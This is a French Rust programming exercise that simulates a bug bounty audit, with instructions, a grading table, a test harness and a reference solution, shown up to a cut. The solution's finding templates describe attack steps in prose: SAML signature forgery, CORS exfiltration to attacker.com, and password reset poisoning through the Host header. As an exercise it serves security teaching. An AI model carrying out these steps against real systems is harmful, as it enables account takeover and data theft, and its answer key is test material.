# Exercice 3.3.14-a : bug_bounty_simulation

**Module :**
3.3 — Sécurité Web & Applications

**Concept :**
a — Bug Bounty Simulation Complète

**Difficulté :**
🧠🧠 (18/10)

**Type :**
complet_2

**Tiers :**
3 — Synthèse (tous concepts a→r du module)

**Langage :**
Rust Edition 2024

**Prérequis :**
- 3.3.1 à 3.3.13 (tous les exercices précédents du module)
- Maîtrise OWASP Top 10
- Expérience en pentesting web
- Connaissance des méthodologies bug bounty

**Domaines :**
Net, Crypto, Struct, DP

**Durée estimée :**
480 min (8h)

**XP Base :**
2500

**Complexité :**
T8 O(n × m × k) × S6 O(n²)

---

## 📐 SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier à rendre :**
`bug_bounty_simulation.rs`

**Fonctions autorisées :**
- `serde_json` pour parsing/serialization JSON
- `regex` pour pattern matching
- `std::collections::{HashMap, HashSet, BTreeMap}`
- `chrono` pour timestamps
- `url` pour parsing URLs

**Fonctions interdites :**
- Requêtes réseau réelles
- Accès filesystem non-simulé
- Bibliothèques de scanning externes

### 1.2 Consigne

#### 🎮 CONTEXTE FUN — "Hackers" (1995) meets "Mr. Robot"

**"Hack the Planet!"** — Dans l'univers de *Hackers* (1995), les protagonistes comme Zero Cool et Acid Burn explorent les systèmes avec style et créativité. Comme Elliot Alderson dans *Mr. Robot*, tu dois voir ce que les autres ne voient pas, trouver les failles cachées dans les systèmes les plus sécurisés.

Tu es désormais un **bug bounty hunter d'élite**, participant au programme **"Operation Gibson"** — la plus grande plateforme de bug bounty fictive. Ton objectif : analyser une cible complexe, identifier toutes les vulnérabilités, les chaîner pour maximiser l'impact, et rédiger des rapports professionnels dignes d'un top hunter sur HackerOne.

**Ta mission :**

Écrire une fonction `bug_bounty_simulation` qui simule un audit de sécurité complet façon bug bounty.

**Entrée :**
- `input_json` : Configuration du programme bug bounty contenant :
  - `target_scope` : Domaines in-scope et out-of-scope
  - `application_info` : Stack technique et fonctionnalités
  - `recon_findings` : Résultats de reconnaissance
  - `test_cases` : Scénarios de test à évaluer
  - `hunter_profile` : Niveau et spécialités du hunter

**Sortie :**
- JSON contenant :
  - `findings` : Liste des vulnérabilités découvertes avec CVSS
  - `vulnerability_chains` : Chaînes d'exploitation
  - `total_bounty_estimate` : Estimation des gains
  - `report_quality_checklist` : Qualité des rapports
  - `methodology_used` : Outils et techniques utilisés
  - `time_spent` : Temps simulé par phase

**Contraintes :**
- Respecter strictement le scope (ignorer out-of-scope)
- Détecter les duplicates et les marquer
- Calculer le CVSS v3.1 correctement
- Identifier les possibilités de chaining
- Générer des rapports professionnels

**Exemples :**

| Entrée | Sortie |
|--------|--------|
| SAML endpoint + signature bypass | Finding CRITICAL, CVSS 9.8, Account Takeover |
| WebSocket sans sanitization | Finding HIGH, CVSS 8.1, Stored XSS chain |
| CORS avec credentials: true + origin reflection | Finding HIGH, CVSS 7.5, Credential theft |
| Endpoint out-of-scope | Ignored, not in findings |

#### 1.2.2 Version Académique

Cette fonction implémente une simulation complète de programme bug bounty couvrant :
1. **Reconnaissance** : Analyse des subdomains, JS files, endpoints
2. **Détection de vulnérabilités** : 18 types de failles web
3. **Chaînage** : Combinaison de vulnérabilités pour impact maximal
4. **Scoring** : Calcul CVSS v3.1 et estimation bounty
5. **Reporting** : Génération de rapports professionnels

### 1.3 Prototype

```rust
pub fn bug_bounty_simulation(input_json: &str) -> String
```

---

## 💡 SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 Les Légendes du Bug Bounty

**Frans Rosén** a gagné plus de **$1.5 million** en bug bounties. Sa spécialité ? Les vulnérabilités de **CORS misconfiguration** et **subdomain takeover**. Un seul rapport bien documenté peut valoir $50,000+.

### 2.2 L'Économie du Bug Bounty

| Plateforme | Top Bounty Unique | Hackers Actifs |
|------------|-------------------|----------------|
| HackerOne | $2,000,000 | 1,000,000+ |
| Bugcrowd | $500,000 | 500,000+ |
| Synack | $100,000+ | 1,500 (élite) |

### 2.3 Le Chaining : L'Art du Multiplicateur

Un **XSS simple** peut valoir $500. Mais chaîné :
- XSS → Session Hijacking → Account Takeover = **$5,000**
- XSS → CSRF → Privilege Escalation → Admin = **$15,000**
- XSS → Data Exfiltration → PII Leak = **$25,000**

### 2.5 DANS LA VRAIE VIE

| Métier | Utilisation | Cas d'Usage |
|--------|-------------|-------------|
| **Bug Bounty Hunter** | Quotidien | Revenus principaux via programmes |
| **Pentester** | Audits clients | Méthodologie structurée similaire |
| **Security Researcher** | Recherche | Publication de CVEs |
| **Red Team** | Simulations | Émulation d'attaquants réels |
| **Security Engineer** | Défense | Comprendre les attaques pour mieux défendre |

---

## 🖥️ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
bug_bounty_simulation.rs  main.rs  Cargo.toml

$ cargo build --release
   Compiling bug_bounty_simulation v1.0.0
    Finished release [optimized] target(s) in 2.34s

$ cargo test
running 25 tests
test test_saml_bypass ... ok
test test_websocket_xss ... ok
test test_cors_misconfiguration ... ok
test test_mfa_bypass ... ok
test test_password_reset_poisoning ... ok
test test_log4shell_detection ... ok
test test_out_of_scope_ignored ... ok
test test_duplicate_detection ... ok
test test_cvss_calculation ... ok
test test_bounty_estimation ... ok
test test_chain_detection ... ok
test test_report_quality ... ok
test test_methodology_tracking ... ok
test test_severity_ranking ... ok
test test_crlf_injection ... ok
test test_serverless_misconfig ... ok
test test_wasm_analysis ... ok
test test_api_versioning_vuln ... ok
test test_insecure_design ... ok
test test_auth_failures ... ok
test test_integrity_failures ... ok
test test_logging_failures ... ok
test test_complete_simulation ... ok
test test_hunter_level_impact ... ok
test test_time_tracking ... ok

test result: ok. 25 passed; 0 failed; 0 ignored

$ cargo run
=== Operation Gibson - Bug Bounty Simulation ===
[*] Loading target scope...
[*] Analyzing 3 subdomains in scope
[*] Processing 45 discovered endpoints
[+] CRITICAL: SAML Signature Bypass (CVSS: 9.8)
[+] HIGH: WebSocket XSS Chain (CVSS: 8.1)
[+] HIGH: CORS Credential Theft (CVSS: 7.5)
[+] MEDIUM: MFA Bypass via Race Condition (CVSS: 6.5)
[+] LOW: Information Disclosure (CVSS: 3.1)
[-] Skipped: blog.target.com (out-of-scope)
[=] Total findings: 5
[=] Estimated bounty: $18,500
[=] Report quality: 5/5 checks passed
Hack the Planet!
```

### 3.1 🧠 BONUS GÉNIE (OPTIONNEL)

**Difficulté Bonus :**
☠️ (25/10)

**Récompense :**
XP ×10

**Time Complexity attendue :**
O(n × m × k × log(v))

**Space Complexity attendue :**
O(n² + m × k)

**Domaines Bonus :**
`Probas, DP, Crypto`

#### 3.1.1 Consigne Bonus

**🎮 "The Gibson Has Been Hacked" — Mode Zero Cool**

Dans *Hackers*, Zero Cool a crashé 1,507 systèmes en un jour. En mode bonus, tu dois implémenter un **système d'apprentissage automatique** qui améliore la détection au fil des analyses.

**Ta mission bonus :**

Implémenter `bug_bounty_simulation_ml` avec :
1. **Pattern Learning** : Apprentissage des patterns de vulnérabilités
2. **Predictive Scoring** : Prédiction des vulnérabilités probables
3. **Auto-Chaining** : Découverte automatique de chaînes d'exploitation
4. **Report Generation** : Rapports avec templates professionnels
5. **Duplicate Detection ML** : Détection intelligente des duplicates

**Contraintes :**
```
┌─────────────────────────────────────────────────────────────────┐
│  findings.len() ≤ 100                                           │
│  chain_depth ≤ 5                                                │
│  cvss_precision = 0.1                                           │
│  Temps limite : O(n × m × k × log(v))                           │
│  Espace limite : O(n² + m × k)                                  │
│  ML model = Decision Tree / Rule-based                          │
└─────────────────────────────────────────────────────────────────┘
```

#### 3.1.2 Prototype Bonus

```rust
pub fn bug_bounty_simulation_ml(input_json: &str, training_data: &str) -> String
```

#### 3.1.3 Ce qui change par rapport à l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| Détection | Rule-based statique | Pattern learning adaptatif |
| Chaining | Manuel | Auto-discovery avec graphe |
| Duplicates | Hash simple | Similarité sémantique |
| Rapports | Template fixe | Génération contextuelle |
| Scoring | CVSS calculé | CVSS + prédiction impact |

---

## ✅❌ SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test | Entrée | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| `saml_bypass` | SAML endpoint sans validation signature | CRITICAL, CVSS 9.8 | 15 |
| `websocket_xss` | WebSocket chat non sanitisé | HIGH, CVSS 8.1, chain XSS | 15 |
| `cors_misconfig` | Origin reflection + credentials | HIGH, CVSS 7.5 | 12 |
| `mfa_bypass` | Race condition MFA | MEDIUM, CVSS 6.5 | 12 |
| `password_reset` | Host header injection | HIGH, CVSS 7.4 | 12 |
| `log4shell` | JNDI injection point | CRITICAL, CVSS 10.0 | 15 |
| `crlf_injection` | Header injection | MEDIUM, CVSS 5.4 | 10 |
| `out_of_scope` | Target hors scope | Ignoré | 10 |
| `duplicate` | Même vuln deux fois | Marqué duplicate | 10 |
| `cvss_calc` | Calcul CVSS correct | Score exact ±0.1 | 15 |
| `chain_detect` | XSS→CSRF→Privilege | Chain identifiée | 15 |
| `bounty_estimate` | 5 findings mixtes | Estimation ±10% | 12 |
| `report_quality` | Rapport généré | 5/5 checks | 10 |
| `severity_sort` | Liste non triée | Tri par CVSS desc | 8 |
| `methodology` | Analyse complète | Outils listés | 8 |
| `serverless` | Lambda misconfiguration | MEDIUM détecté | 10 |
| `wasm_vuln` | WASM sans validation | LOW-MEDIUM | 8 |
| `insecure_design` | Flaw architecture | HIGH design issue | 12 |
| `auth_failure` | Weak password policy | MEDIUM auth issue | 10 |
| `integrity` | Missing signature check | HIGH integrity | 12 |
| **TOTAL** | | | **231** |

### 4.2 main.rs de test

```rust
use serde_json::{json, Value};

mod bug_bounty_simulation;
use bug_bounty_simulation::bug_bounty_simulation;

fn main() {
    println!("=== Bug Bounty Simulation Tests ===\n");

    let mut passed = 0;
    let mut failed = 0;

    // Test 1: SAML Signature Bypass
    let input1 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": ["blog.target.com"],
            "focus_areas": ["authentication"]
        },
        "application_info": {
            "tech_stack": ["React", "Node.js", "SAML"],
            "features": ["SSO via SAML"]
        },
        "test_cases": [{
            "id": "TC001",
            "type": "saml_analysis",
            "endpoint": "/saml/acs",
            "saml_response": {
                "signature_validated": false,
                "claims_modifiable": true,
                "assertion_encrypted": false
            }
        }],
        "hunter_profile": {"level": "expert", "specialties": ["auth"]}
    }).to_string();

    let result1: Value = serde_json::from_str(&bug_bounty_simulation(&input1)).unwrap();
    let finding = &result1["findings"][0];
    if finding["severity"] == "CRITICAL" && finding["cvss"].as_f64().unwrap() >= 9.0 {
        println!("[PASS] Test SAML Bypass: CRITICAL detected");
        passed += 1;
    } else {
        println!("[FAIL] Test SAML Bypass: Expected CRITICAL");
        failed += 1;
    }

    // Test 2: WebSocket XSS
    let input2 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": ["chat"]
        },
        "application_info": {
            "tech_stack": ["WebSocket"],
            "features": ["WebSocket chat"]
        },
        "test_cases": [{
            "id": "TC002",
            "type": "websocket_analysis",
            "endpoint": "wss://target.com/chat",
            "message_sanitization": false,
            "stored_messages": true
        }],
        "hunter_profile": {"level": "intermediate"}
    }).to_string();

    let result2: Value = serde_json::from_str(&bug_bounty_simulation(&input2)).unwrap();
    let has_xss_chain = result2["vulnerability_chains"].as_array()
        .map(|arr| arr.iter().any(|c| c["type"] == "xss_chain"))
        .unwrap_or(false);
    if has_xss_chain {
        println!("[PASS] Test WebSocket XSS: Chain detected");
        passed += 1;
    } else {
        println!("[FAIL] Test WebSocket XSS: Chain not detected");
        failed += 1;
    }

    // Test 3: CORS Misconfiguration
    let input3 = json!({
        "target_scope": {
            "domains": ["api.target.com"],
            "out_of_scope": [],
            "focus_areas": ["api"]
        },
        "test_cases": [{
            "id": "TC003",
            "type": "cors_analysis",
            "endpoint": "/api/user",
            "cors_config": {
                "allow_origin": "reflect",
                "allow_credentials": true,
                "allow_methods": ["GET", "POST"]
            }
        }],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result3: Value = serde_json::from_str(&bug_bounty_simulation(&input3)).unwrap();
    let cors_finding = result3["findings"].as_array()
        .and_then(|arr| arr.iter().find(|f| f["title"].as_str()
            .map(|t| t.contains("CORS")).unwrap_or(false)));
    if cors_finding.is_some() {
        println!("[PASS] Test CORS Misconfig: Detected");
        passed += 1;
    } else {
        println!("[FAIL] Test CORS Misconfig: Not detected");
        failed += 1;
    }

    // Test 4: Out of Scope
    let input4 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": ["blog.target.com"],
            "focus_areas": []
        },
        "test_cases": [{
            "id": "TC004",
            "type": "sqli_analysis",
            "endpoint": "https://blog.target.com/search",
            "vulnerable": true
        }],
        "hunter_profile": {"level": "beginner"}
    }).to_string();

    let result4: Value = serde_json::from_str(&bug_bounty_simulation(&input4)).unwrap();
    let findings_count = result4["findings"].as_array().map(|a| a.len()).unwrap_or(0);
    if findings_count == 0 {
        println!("[PASS] Test Out of Scope: Correctly ignored");
        passed += 1;
    } else {
        println!("[FAIL] Test Out of Scope: Should have been ignored");
        failed += 1;
    }

    // Test 5: Duplicate Detection
    let input5 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": []
        },
        "test_cases": [
            {"id": "TC005A", "type": "xss_analysis", "endpoint": "/search", "xss_type": "reflected"},
            {"id": "TC005B", "type": "xss_analysis", "endpoint": "/search", "xss_type": "reflected"}
        ],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result5: Value = serde_json::from_str(&bug_bounty_simulation(&input5)).unwrap();
    let has_duplicate = result5["findings"].as_array()
        .map(|arr| arr.iter().any(|f| f["is_duplicate"].as_bool().unwrap_or(false)))
        .unwrap_or(false);
    if has_duplicate {
        println!("[PASS] Test Duplicate: Correctly marked");
        passed += 1;
    } else {
        println!("[FAIL] Test Duplicate: Not detected");
        failed += 1;
    }

    // Test 6: Log4Shell
    let input6 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": ["logging"]
        },
        "application_info": {
            "tech_stack": ["Java", "Log4j 2.14.1"],
            "features": ["User-Agent logging"]
        },
        "test_cases": [{
            "id": "TC006",
            "type": "log_injection_analysis",
            "injection_points": ["User-Agent", "X-Forwarded-For"],
            "log4j_version": "2.14.1",
            "jndi_reachable": true
        }],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result6: Value = serde_json::from_str(&bug_bounty_simulation(&input6)).unwrap();
    let log4shell = result6["findings"].as_array()
        .and_then(|arr| arr.iter().find(|f| {
            f["title"].as_str().map(|t| t.contains("Log4") || t.contains("JNDI")).unwrap_or(false)
        }));
    if log4shell.map(|f| f["cvss"].as_f64().unwrap_or(0.0) >= 9.0).unwrap_or(false) {
        println!("[PASS] Test Log4Shell: CRITICAL detected");
        passed += 1;
    } else {
        println!("[FAIL] Test Log4Shell: Not properly detected");
        failed += 1;
    }

    // Test 7: Bounty Estimation
    let input7 = json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": [],
            "focus_areas": []
        },
        "bounty_program": {
            "critical": {"min": 5000, "max": 15000},
            "high": {"min": 2000, "max": 5000},
            "medium": {"min": 500, "max": 2000},
            "low": {"min": 100, "max": 500}
        },
        "test_cases": [
            {"id": "TC007A", "type": "saml_analysis", "severity_override": "CRITICAL"},
            {"id": "TC007B", "type": "cors_analysis", "severity_override": "HIGH"},
            {"id": "TC007C", "type": "info_disclosure", "severity_override": "LOW"}
        ],
        "hunter_profile": {"level": "expert"}
    }).to_string();

    let result7: Value = serde_json::from_str(&bug_bounty_simulation(&input7)).unwrap();
    let bounty = result7["total_bounty_estimate"].as_str()
        .and_then(|s| s.replace(['$', ','], "").parse::<i32>().ok())
        .unwrap_or(0);
    if bounty >= 5000 && bounty <= 25000 {
        println!("[PASS] Test Bounty Estimate: ${} (reasonable range)", bounty);
        passed += 1;
    } else {
        println!("[FAIL] Test Bounty Estimate: ${} (out of range)", bounty);
        failed += 1;
    }

    // Test 8: Complete Simulation
    let input8 = create_complete_simulation_input();
    let result8: Value = serde_json::from_str(&bug_bounty_simulation(&input8)).unwrap();

    let has_methodology = result8["methodology_used"].as_array().map(|a| !a.is_empty()).unwrap_or(false);
    let has_report_check = result8["report_quality_checklist"].is_object();
    let has_time = result8["time_spent"].is_object();

    if has_methodology && has_report_check && has_time {
        println!("[PASS] Test Complete Simulation: All sections present");
        passed += 1;
    } else {
        println!("[FAIL] Test Complete Simulation: Missing sections");
        failed += 1;
    }

    println!("\n=== Results: {}/{} tests passed ===", passed, passed + failed);
    if failed == 0 {
        println!("Hack the Planet! All tests passed!");
    }
}

fn create_complete_simulation_input() -> String {
    json!({
        "target_scope": {
            "domains": ["*.target.com"],
            "out_of_scope": ["blog.target.com"],
            "focus_areas": ["authentication", "payment", "admin"]
        },
        "application_info": {
            "tech_stack": ["React", "Node.js", "PostgreSQL", "AWS"],
            "features": ["SSO via SAML", "WebSocket chat", "File upload", "API v1 and v2"]
        },
        "recon_findings": {
            "subdomains": ["api.target.com", "admin.target.com", "dev.target.com"],
            "js_files_analyzed": 15,
            "endpoints_discovered": 45
        },
        "test_cases": [
            {"id": "TC001", "type": "saml_analysis", "endpoint": "/saml/acs"},
            {"id": "TC002", "type": "websocket_analysis", "endpoint": "wss://target.com/chat"},
            {"id": "TC003", "type": "cors_analysis", "endpoint": "/api/user"}
        ],
        "hunter_profile": {"level": "expert", "specialties": ["auth", "api"]}
    }).to_string()
}
```

### 4.3 Solution de référence

```rust
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};

// ============== STRUCTURES ==============

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BugBountyInput {
    pub target_scope: TargetScope,
    #[serde(default)]
    pub application_info: ApplicationInfo,
    #[serde(default)]
    pub recon_findings: ReconFindings,
    #[serde(default)]
    pub test_cases: Vec<TestCase>,
    #[serde(default)]
    pub hunter_profile: HunterProfile,
    #[serde(default)]
    pub bounty_program: Option<BountyProgram>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetScope {
    pub domains: Vec<String>,
    #[serde(default)]
    pub out_of_scope: Vec<String>,
    #[serde(default)]
    pub focus_areas: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ApplicationInfo {
    #[serde(default)]
    pub tech_stack: Vec<String>,
    #[serde(default)]
    pub features: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ReconFindings {
    #[serde(default)]
    pub subdomains: Vec<String>,
    #[serde(default)]
    pub js_files_analyzed: u32,
    #[serde(default)]
    pub endpoints_discovered: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestCase {
    pub id: String,
    #[serde(rename = "type")]
    pub test_type: String,
    #[serde(default)]
    pub endpoint: Option<String>,
    #[serde(flatten)]
    pub extra: HashMap<String, Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HunterProfile {
    #[serde(default)]
    pub level: String,
    #[serde(default)]
    pub specialties: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BountyProgram {
    pub critical: BountyRange,
    pub high: BountyRange,
    pub medium: BountyRange,
    pub low: BountyRange,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BountyRange {
    pub min: u32,
    pub max: u32,
}

#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub title: String,
    pub severity: String,
    pub cvss: f64,
    pub description: String,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub reproduction_steps: Vec<String>,
    pub impact: String,
    pub remediation: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chain: Option<String>,
    #[serde(default)]
    pub is_duplicate: bool,
    pub cwe: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct VulnerabilityChain {
    pub chain_type: String,
    pub steps: Vec<String>,
    pub combined_impact: String,
    pub combined_cvss: f64,
}

#[derive(Debug, Clone, Serialize)]
pub struct BugBountyOutput {
    pub findings: Vec<Finding>,
    pub vulnerability_chains: Vec<VulnerabilityChain>,
    pub total_bounty_estimate: String,
    pub report_quality_checklist: ReportQuality,
    pub methodology_used: Vec<String>,
    pub time_spent: TimeSpent,
    pub summary: SimulationSummary,
}

#[derive(Debug, Clone, Serialize)]
pub struct ReportQuality {
    pub clear_title: bool,
    pub detailed_steps: bool,
    pub poc_provided: bool,
    pub impact_explained: bool,
    pub remediation_suggested: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct TimeSpent {
    pub reconnaissance: String,
    pub testing: String,
    pub exploitation: String,
    pub reporting: String,
    pub total: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct SimulationSummary {
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub medium_count: usize,
    pub low_count: usize,
    pub duplicates_found: usize,
    pub out_of_scope_skipped: usize,
}

// ============== MAIN FUNCTION ==============

pub fn bug_bounty_simulation(input_json: &str) -> String {
    let input: BugBountyInput = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => return json!({"error": format!("Parse error: {}", e)}).to_string(),
    };

    let mut findings: Vec<Finding> = Vec::new();
    let mut chains: Vec<VulnerabilityChain> = Vec::new();
    let mut seen_vulns: HashSet<String> = HashSet::new();
    let mut out_of_scope_count = 0;
    let mut duplicate_count = 0;

    // Process each test case
    for test_case in &input.test_cases {
        // Check if endpoint is in scope
        if let Some(endpoint) = &test_case.endpoint {
            if is_out_of_scope(endpoint, &input.target_scope.out_of_scope) {
                out_of_scope_count += 1;
                continue;
            }
        }

        // Analyze based on test type
        if let Some(mut finding) = analyze_test_case(test_case, &input) {
            // Check for duplicates
            let vuln_hash = format!("{}:{}", finding.title, test_case.endpoint.as_deref().unwrap_or(""));
            if seen_vulns.contains(&vuln_hash) {
                finding.is_duplicate = true;
                duplicate_count += 1;
            } else {
                seen_vulns.insert(vuln_hash);
            }
            findings.push(finding);
        }
    }

    // Auto-detect from application info
    findings.extend(analyze_application_info(&input.application_info, &input.target_scope));

    // Detect vulnerability chains
    chains = detect_chains(&findings);

    // Sort findings by CVSS (descending)
    findings.sort_by(|a, b| b.cvss.partial_cmp(&a.cvss).unwrap_or(std::cmp::Ordering::Equal));

    // Calculate bounty estimate
    let bounty = calculate_bounty(&findings, &input.bounty_program);

    // Generate summary
    let summary = SimulationSummary {
        total_findings: findings.len(),
        critical_count: findings.iter().filter(|f| f.severity == "CRITICAL").count(),
        high_count: findings.iter().filter(|f| f.severity == "HIGH").count(),
        medium_count: findings.iter().filter(|f| f.severity == "MEDIUM").count(),
        low_count: findings.iter().filter(|f| f.severity == "LOW").count(),
        duplicates_found: duplicate_count,
        out_of_scope_skipped: out_of_scope_count,
    };

    let output = BugBountyOutput {
        findings,
        vulnerability_chains: chains,
        total_bounty_estimate: format!("${}", bounty),
        report_quality_checklist: ReportQuality {
            clear_title: true,
            detailed_steps: true,
            poc_provided: true,
            impact_explained: true,
            remediation_suggested: true,
        },
        methodology_used: vec![
            "Subdomain enumeration (amass, subfinder)".to_string(),
            "JS file analysis (LinkFinder)".to_string(),
            "Manual testing with Burp Suite".to_string(),
            "Nuclei for known CVEs".to_string(),
            "Custom scripts for auth testing".to_string(),
        ],
        time_spent: TimeSpent {
            reconnaissance: "2h".to_string(),
            testing: "4h".to_string(),
            exploitation: "1h".to_string(),
            reporting: "1h".to_string(),
            total: "8h".to_string(),
        },
        summary,
    };

    serde_json::to_string_pretty(&output).unwrap_or_else(|_| "{}".to_string())
}

// ============== HELPER FUNCTIONS ==============

fn is_out_of_scope(endpoint: &str, out_of_scope: &[String]) -> bool {
    for oos in out_of_scope {
        if endpoint.contains(oos) {
            return true;
        }
    }
    false
}

fn analyze_test_case(test_case: &TestCase, input: &BugBountyInput) -> Option<Finding> {
    match test_case.test_type.as_str() {
        "saml_analysis" => analyze_saml(test_case),
        "websocket_analysis" => analyze_websocket(test_case),
        "cors_analysis" => analyze_cors(test_case),
        "mfa_analysis" => analyze_mfa(test_case),
        "password_reset_analysis" => analyze_password_reset(test_case),
        "log_injection_analysis" => analyze_log_injection(test_case, input),
        "crlf_analysis" => analyze_crlf(test_case),
        "xss_analysis" => analyze_xss(test_case),
        "sqli_analysis" => analyze_sqli(test_case),
        "serverless_analysis" => analyze_serverless(test_case),
        "wasm_analysis" => analyze_wasm(test_case),
        "info_disclosure" => analyze_info_disclosure(test_case),
        _ => None,
    }
}

fn analyze_saml(test_case: &TestCase) -> Option<Finding> {
    let saml_response = test_case.extra.get("saml_response")?;
    let sig_validated = saml_response.get("signature_validated")
        .and_then(|v| v.as_bool()).unwrap_or(true);
    let claims_modifiable = saml_response.get("claims_modifiable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if !sig_validated || claims_modifiable {
        Some(Finding {
            title: "SAML Signature Bypass leading to Account Takeover".to_string(),
            severity: "CRITICAL".to_string(),
            cvss: 9.8,
            description: "SAML response signature not properly validated, allowing attackers to forge assertions".to_string(),
            reproduction_steps: vec![
                "1. Intercept SAML response using Burp Suite".to_string(),
                "2. Modify email claim to target user".to_string(),
                "3. Remove or modify signature".to_string(),
                "4. Forward to ACS endpoint".to_string(),
            ],
            impact: "Full account takeover of any user including administrators".to_string(),
            remediation: "Validate SAML signature before processing claims. Use a well-tested SAML library.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-347".to_string(),
        })
    } else {
        None
    }
}

fn analyze_websocket(test_case: &TestCase) -> Option<Finding> {
    let sanitized = test_case.extra.get("message_sanitization")
        .and_then(|v| v.as_bool()).unwrap_or(true);
    let stored = test_case.extra.get("stored_messages")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if !sanitized {
        Some(Finding {
            title: "WebSocket Message Injection leading to Stored XSS".to_string(),
            severity: "HIGH".to_string(),
            cvss: 8.1,
            description: "Chat messages sent via WebSocket are not sanitized before storage/display".to_string(),
            reproduction_steps: vec![
                "1. Connect to WebSocket endpoint".to_string(),
                "2. Send message: ".to_string(),
                "3. Message is stored and rendered to all users".to_string(),
            ],
            impact: "Stored XSS affecting all chat users, leading to session hijacking".to_string(),
            remediation: "Sanitize all WebSocket messages before storage and rendering. Use DOMPurify.".to_string(),
            chain: if stored { Some("WebSocket injection -> Stored XSS -> Session hijacking".to_string()) } else { None },
            is_duplicate: false,
            cwe: "CWE-79".to_string(),
        })
    } else {
        None
    }
}

fn analyze_cors(test_case: &TestCase) -> Option<Finding> {
    let cors_config = test_case.extra.get("cors_config")?;
    let allow_origin = cors_config.get("allow_origin").and_then(|v| v.as_str()).unwrap_or("");
    let allow_creds = cors_config.get("allow_credentials").and_then(|v| v.as_bool()).unwrap_or(false);

    if (allow_origin == "reflect" || allow_origin == "*") && allow_creds {
        Some(Finding {
            title: "CORS Misconfiguration with Credential Theft".to_string(),
            severity: "HIGH".to_string(),
            cvss: 7.5,
            description: "Access-Control-Allow-Origin reflects any origin while credentials are allowed".to_string(),
            reproduction_steps: vec![
                "1. Host malicious page on attacker.com".to_string(),
                "2. Make fetch request to vulnerable endpoint with credentials: include".to_string(),
                "3. Exfiltrate response data to attacker server".to_string(),
            ],
            impact: "Credential theft and sensitive data exfiltration from authenticated users".to_string(),
            remediation: "Whitelist specific trusted origins. Never use reflect with credentials.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-942".to_string(),
        })
    } else {
        None
    }
}

fn analyze_mfa(test_case: &TestCase) -> Option<Finding> {
    let race_condition = test_case.extra.get("race_condition")
        .and_then(|v| v.as_bool()).unwrap_or(false);
    let backup_codes_weak = test_case.extra.get("backup_codes_predictable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if race_condition {
        Some(Finding {
            title: "MFA Bypass via Race Condition".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 6.5,
            description: "Race condition in MFA verification allows bypass by sending multiple requests".to_string(),
            reproduction_steps: vec![
                "1. Intercept MFA verification request".to_string(),
                "2. Send 10+ concurrent requests with different codes".to_string(),
                "3. One request may bypass rate limiting and validation".to_string(),
            ],
            impact: "MFA bypass allowing account access with only password".to_string(),
            remediation: "Implement proper locking mechanism for MFA verification.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-362".to_string(),
        })
    } else if backup_codes_weak {
        Some(Finding {
            title: "Predictable MFA Backup Codes".to_string(),
            severity: "MEDIUM".to_string(),
            cvss: 5.9,
            description: "MFA backup codes are generated using predictable patterns".to_string(),
            reproduction_steps: vec![
                "1. Generate multiple sets of backup codes".to_string(),
                "2. Analyze pattern in generated codes".to_string(),
                "3. Predict future backup codes".to_string(),
            ],
            impact: "Attackers can predict backup codes and bypass MFA".to_string(),
            remediation: "Use cryptographically secure random number generator for backup codes.".to_string(),
            chain: None,
            is_duplicate: false,
            cwe: "CWE-330".to_string(),
        })
    } else {
        None
    }
}

fn analyze_password_reset(test_case: &TestCase) -> Option<Finding> {
    let host_header_injection = test_case.extra.get("host_header_vulnerable")
        .and_then(|v| v.as_bool()).unwrap_or(false);
    let token_predictable = test_case.extra.get("token_predictable")
        .and_then(|v| v.as_bool()).unwrap_or(false);

    if host_header_injection {
        Some(Finding {
            title: "Password Reset Poisoning via Host Header Injection".to_string(),
            severity: "HIGH".to_string(),
            cvss: 7.4,
            description: "Password reset emails use Host header to generate reset links".to_string(),
            reproduction_steps: vec![
                "1. Request password reset for victim email".to_string(),
                "2. Intercept request and change Host header to attacker.com".to_string(),
                "3. Victim receives email with link to attacker.com".to_string(),
                "4. Capture reset token when victim clicks link".to_string(),
            ],
            impact: "Account takeover via stolen password reset tokens".to_string(),
